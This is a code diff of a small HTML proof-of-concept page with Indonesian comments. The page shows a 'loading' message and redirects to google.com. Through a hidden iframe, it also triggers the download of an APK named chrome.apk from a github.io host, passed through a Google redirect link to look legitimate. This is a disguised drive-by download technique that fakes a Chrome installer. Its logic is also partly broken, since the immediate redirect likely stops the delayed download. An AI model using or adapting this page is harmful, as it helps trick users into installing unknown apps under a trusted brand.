@@ -3,32 +3,32 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto Redirect PoC</title>
+    <title>Redirect & Download PoC</title>
     <style>
-        body, html {
-            margin: 0;
-            padding: 0;
-            width: 100%;
-            height: 100%;
-            overflow: hidden;
-        }
-        iframe {
-            width: 100%;
-            height: 100%;
-            border: none;
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+            background-color: #f4f4f9;
         }
     </style>
 </head>
 <body>
 
-    <!-- Iframe memuat URL yang Anda inginkan -->
-    <iframe src="https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fchrome.apk&sa=D&sntz=1&usg=AOvVaw079XKrSIcTiPDZFMOucTH3" id="targetIframe"></iframe>
+    <h2>Memuat halaman...</h2>
+    <p>Mohon tunggu sebentar.</p>
 
     <script>
-        // Skrip untuk melakukan redirect halaman utama secara otomatis setelah beberapa milidetik / saat iframe dimuat
+        // 1. Redirect utama ke Google.com terlebih dahulu
+        window.location.href = "https://www.google.com";
+
+        // 2. Memicu dialog download file APK setelah jeda singkat (misal 1 detik)
         setTimeout(function() {
-            window.location.href = "https://www.google.com";
-        }, 1500); // Penundaan 1.5 detik (bisa diubah sesuai kebutuhan)
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = "https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fchrome.apk&sa=D&sntz=1&usg=AOvVaw079XKrSIcTiPDZFMOucTH3";
+            document.body.appendChild(iframe);
+        }, 1000);
     </script>
 
 </body>
